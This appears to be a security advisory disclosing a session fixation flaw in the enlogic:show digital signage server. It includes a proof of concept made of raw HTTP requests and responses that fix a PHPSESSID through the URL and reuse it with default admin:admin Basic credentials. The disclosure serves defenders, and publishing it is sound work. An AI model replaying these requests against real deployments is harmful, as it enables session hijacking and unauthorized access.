@@ -1,0 +1,94 @@
+
+All-Dynamics Software enlogic:show Digital Signage System 2.0.2 Session Fixation
+
+
+Vendor: All-Dynamics Software GmbH
+Vendor web page: https://www.all-dynamics.de
+Product web page: https://www.enlogic-show.com
+Affected version: 2.0.2 (Build 2098) ILP32W 0/1/3/1597919619
+
+Summary: Bring communication with your customers, guests or employees
+to a new level. You can design content individually and uncomplicated
+centrally and simply present it in different locations. Whether on large
+displays, steles, digital signs or on a projector, with enlogic:show your
+content will appear on the selected display in a calendar-controlled and
+precise manner.
+
+Desc: The initial visit from the welcome.php screen to the login page
+sets a random PHP session identifier in the URL using HTTP GET request.
+An attacker can forge the request sent to the victim setting a fixated
+PHP session that can be used to bypass authentication and execute further
+attacks via CSRF.
+
+Tested on: enlogic:show server
+           Microsoft Windows Server 2019
+           Microsoft Windows Server 2016
+           Microsoft Windows Server 2012
+           Microsoft Windows 10
+           GNU/Linux
+           Apache
+           PHP
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5577
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5577.php
+
+
+21.07.2020
+
+--
+
+
+Visiting the following GET request sets the PHP session:
+--------------------------------------------------------
+
+GET /index.php?PHPSESSID=5adb40dac43ddf2d05ea83d1a958ed65 HTTP/1.1
+Host: localhost:8802
+
+HTTP/1.0 302 Moved Temporarily
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: /index.php?PHPSESSID=5adb40dac43ddf2d05ea83d1a958ed65
+Content-type: text/html
+
+
+Victim is redirected to authorize:
+----------------------------------
+
+HTTP/1.0 401 Authorization Required
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+WWW-Authenticate: Basic realm="enlogic.show server"
+Content-type: text/html
+
+
+Session fixated:
+----------------
+
+GET /index.php?PHPSESSID=5adb40dac43ddf2d05ea83d1a958ed65 HTTP/1.1
+Host: localhost:8802
+Connection: keep-alive
+Cache-Control: max-age=0
+Authorization: Basic YWRtaW46YWRtaW4=
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+
+
+HTTP/1.0 200 OK
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-type: text/html
